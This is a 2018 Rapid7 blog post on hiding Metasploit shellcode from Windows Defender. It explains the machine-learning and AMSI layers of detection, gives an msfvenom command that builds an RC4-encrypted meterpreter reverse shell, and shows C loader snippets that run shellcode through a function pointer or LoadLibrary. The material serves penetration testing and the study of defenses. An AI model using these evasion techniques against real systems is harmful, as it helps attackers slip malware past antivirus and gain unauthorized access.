# Hiding Metasploit Shellcode to Evade Windows Defender

* This was written in May 3 2018 by Wei Chen (_sinn3r)
* Originally published [here](https://www.rapid7.com/blog/post/2018/05/03/hiding-metasploit-shellcode-to-evade-windows-defender/)

## Introduction

Being on the offensive side in the security field, I personally have a lot of respect for the researchers and engineers in the antivirus industry, and the companies dedicated to investing so much in them. If malware development is a cat-and-mouse game, then I would say that the industry creates some of the most terrifying hunters. Penetration testers and red teamers suffer the most from this while using Metasploit, which forced me to look into how to improve our payload evasion—and really, it’s hard.

I had two important requirements for this experiment:

Find a solution to reuse existing Metasploit shellcodes.
The unmodified shellcode should not be detectable by popular antivirus.
One of the challenges with Metasploit shellcode is that they are small, because size matters for various tactical reasons. This also makes shellcode difficult to improve, and eventually, all the AV classifiers have the word “EVIL” written all over the place. You don’t stand a chance.

Most modern antivirus engines are powered by machine learning, and this has been a huge game changer for AV evasion. Not only are AV engines much smarter at detecting potential threats, they also respond much quicker. As soon as your code behavior is something too malicious-looking, which can be as simple as using the wrong Windows API (such as WriteProcessMemory or even a VirtualAlloc, one of the AI checks will get you. The malware researchers also get a copy of your code, which means you will burn all of your hard work within minutes.

The best way to describe what a machine learning-based antivirus looks like is that there are two components to the design: a client ML and the cloud ML.

## Client ML

The client ML is something we, as users, actually interact with. The vast majority of scanned objects are evaluated by the lightweight machine learning models built into the Windows Defender client, which runs locally on the operating system.

Classifications such as traditional signatures, generic, behavior detection, heuristics, and so on pick up 97% of malware on the client according to Microsoft. Using these classifiers, the client also collects “features” of the program, meaning measurable data or characteristics of the scanned object.

The client machine can operate independently, but without the cloud, Windows Defender works best at detecting known threats, and not the unknown ones. This means that if you are having trouble connecting to the internet, you are much more vulnerable from an internal attack.

## Cloud ML

The cloud ML is kind of the mysterious one, because we don’t have access to the code and the training data, except for some blog posts published on Microsoft’s website and a hint at the use of the LightGBM framework.

The LightGBM framework is based on the Decision Tree model. Although popular, ask any machine learning scientists and they will tell you this is really basic. College graduates with Computer Science degrees should be able to tell you a thing or two about it, too.

In machine learning, the hottest subject has been the Deep Learning model. While Microsoft does have a deep learning toolkit called CNTK, there isn’t so much information about how Windows Defender’s cloud ML might be using it, so this is not something we will discuss further.

What we do know is that when the client ML cannot reach a definitive verdict, it will use the cloud service for deeper analysis. And when this process is involved, it becomes a nightmare for the malware.

The first round of the analysis is the metadata-based ML models. On your operating system, this would be the cloud-delivered protection option, and you can notice it in action due to the extra delay when you execute a file on Windows. Quite often, it is not a problem for me to evade the client ML’s static and real-time protection, but I start to fail when cloud-delivered protection is turned on.

To take full advantage of the cloud service, there is another option called Automatic Sample Submission that basically sends your suspicious-looking program to Microsoft, and runs by additional detections such as sample analysis-based and detonation-based ML models.

If the cloud decides your program is bad, then it will be labeled as one of these generic AI checks: Fuerboos, Fury, Cloxer, or Azden. And then your attack will never work again.

## Antimalware Scan Interface

Antimalware Scan Interface (AMSI) is a programming interface created by Microsoft that allows any Windows applications to take advantage of Windows Defender’s engine and scan for malicious inputs, which makes AV evasion even more difficult. An example of such an application is Powershell, which brings us an opportunity to talk about why Powershell isn’t necessarily your best friend when it comes to AV evasion.

Powershell has been a huge playground for attackers, because antivirus doesn’t do a great job at checking it compared to a traditional executable. You can also pass a line of Powershell code as an argument for Powershell.exe, which creates stealth because technically we are not touching the disk. For example:

```
powershell.exe -command "Write-Output [Convert]::FromBase64String('SGVsbG8gV29ybGQh')"
```

This is kind of where Powershell sells you out. Under the hood, Powershell actually calls the AmsiScanBuffer function to ask Windows Defender whether the user-supplied code is malicious or not:

![1](1.png)

Powershell is so heavily abused, it is starting to look predictable. If you are an IT admin, and you see some Base64 string being passed to Powershell.exe, it is probably up to no good. As attackers, we should recognize that Powershell is no longer everyone’s top favorite payload technique. The AMSI offers any Windows applications the ability to benefit from Windows Defender’s capabilities, which is making scripting languages harder to abuse.

Despite all the technologies Windows Defender is equipped with, it is not without some blind spots. To ensure the survival of our payloads, I discovered some tips that I would like to share:

## Shellcode Survival Tip 1: Encryption

If you are familiar with the [Metasploit Framework](https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers), you would know that there is a module type called encoders. The purpose of an encoder is really to get around bad characters in exploits. For example, if you are exploiting a buffer overflow, chances are your long string (including the payload) cannot have a null character in it. We can use an encoder to change that null byte, and then change it back at run-time.

I’m pretty sure at one point of your life, you’ve tried to use an encoder to bypass AV. Although this might work sometimes, encoders aren’t meant for AV evasion at all. You should use encryption.

Encryption is one of those things that will defeat antivirus’ static scanning effectively, because the AV engine can’t always see the pattern immediately. Currently, there are a few encryption/encoding types msfvenom supports to protect your shellcode: AES256-CBC, RC4, XOR, and Base64.

To generate an encrypted shellcode with msfvenom, here is an example with Metasploit 5:

```
ruby ./msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 --encrypt rc4 --encrypt-key thisisakey -f c
```

The above generates a windows/meterpreter/reverse_tcp that is encrypted with RC4. It is also generated in C format, so that you can build your own loader in C/C++.

Although antivirus isn’t good at scanning encrypted shellcode statically, run-time monitoring is still a strong line of defense. It is easy to get caught after you decrypt and execute it.

## Shellcode Survival Tip 2: Separation

Run-time detection is really difficult to fool, because at the end of the day, you have to execute the code. Once you do that, antivirus logs your every move and then finally determines you are malware. This, however, seems to be less of a problem if you can separate the loader from the actual payload in different process spaces.

This is a behavior I noticed while trying to execute my decrypted payload. First I was able to decrypt my shellcode perfectly fine, with my evil shellcode still in memory, but as soon as I tried to execute it from a function pointer like this, AV would catch me:

```
int (*func)();
func = (int (*)()) shellcode;
(int)(*func)();
```

However, if I removed the last line, then AV was fine with the program:

```
(int)(*func)();
```

This seems to imply that it’s usually okay to have harmful code in memory as long as you don’t execute it. Run-time analysis probably relies a lot on what code is actually executed; it cares less about what the program could potentially do. This makes sense, of course. If it does, the performance penalty is too high.

So instead of using a function pointer, I did a LoadLibrary to solve the problem with the loader:

```c
int main(void) {
  HMODULE hMod = LoadLibrary("shellcode.dll");
  if (hMod == nullptr) {
    cout << "Failed to load shellcode.dll" << endl;
  }

  return 0;
}
```

## The Mouse Lives Another Day…For Now

AV evasion is actually a difficult game. Despite the fact I was able to find a solution that can work around the detections, it should be no concern that they will catch whatever cool tricks you have, and terminate your attack quickly thanks to the cutting edge technologies and the talented people behind it.

It’s a lot like surviving a cat-and-mouse game. And today, the mouse lives. Using things like encryption and custom loader, you can still create something that is difficult enough for the AV engine to understand and lets you successfully gain access on the target machine.

The following is a demonstration that combines all the techniques described above:

## Metasploit Is Free!

By the way, did I mention Metasploit Framework is actually free? Download it [here](https://metasploit.com/).

If you are curious on where to get a sneak peak of Metasploit 5, it is currently under development. The best source is [Metasploit’s Github repository](https://github.com/rapid7/metasploit-framework): watch the pull requests with the msf5 label. We accept pull requests, too!
